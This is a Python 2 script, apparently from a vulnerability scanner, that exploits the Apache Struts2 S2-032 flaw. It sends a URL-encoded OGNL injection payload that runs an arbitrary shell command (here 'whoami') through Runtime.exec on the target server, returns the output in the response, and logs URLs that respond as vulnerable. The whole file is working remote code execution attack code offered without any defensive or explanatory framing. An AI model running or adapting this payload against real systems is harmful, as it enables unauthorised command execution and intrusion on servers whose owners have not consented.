#!coding=utf-8
import urllib2
'''
@exp_032

'''

class struts2_032:
	
	def __init__(self,url):
		self.headers={ 'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6' }
		self.url=url.split("action")[0]+"action"
		self.run()

	def run(self):
		exp_032='?method:%23_memberAccess%3d%40ognl.OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&command=whoami'
		self.s_(exp_032)
		
	def s_(self,exp):
		try:
			#print self.url+exp
			req=urllib2.Request(url=self.url+exp,headers=self.headers)
			res=urllib2.urlopen(req)
			if res.code==200:
				body=res.read()
				if "\x00" in body:
					result=self.url
					f=open("./output/struts2_032.txt","a")
					f.write(result+"\n")
					f.close()
					print "[*struts2_032*]"+result
		except:# Exception,e:
			#print e
			pass

